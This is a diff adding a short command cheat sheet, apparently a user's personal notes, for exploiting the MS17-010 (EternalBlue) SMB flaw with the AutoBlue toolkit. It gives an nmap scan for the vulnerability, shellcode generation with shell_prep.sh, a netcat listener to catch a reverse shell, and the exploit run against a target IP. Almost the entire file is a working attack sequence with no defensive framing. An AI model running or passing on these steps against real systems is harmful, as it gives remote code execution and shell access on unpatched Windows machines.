@@ -1,0 +1,20 @@
+nmap -sV -p 445 --script=smb-vuln-ms17-010 "IP"
+
+┌──(root㉿sebas)-[/home/sebastianrojas]
+└─# cd Descargas/AutoBlue-MS17-010-master/shellcode/                                                                                                        
+eternalblue_kshellcode_x64.asm  eternalblue_kshellcode_x86.asm  eternalblue_sc_merge.py         shell_prep.sh
+
+
+chmod +x shell_prep.sh
+
+./shell_prep.sh
+
+MI IP
+1234
+1234
+1
+1  
+
+nc -nvlp 1234
+
+python eternalblue_exploit.py "IP" shellcode/sc_x64.bin
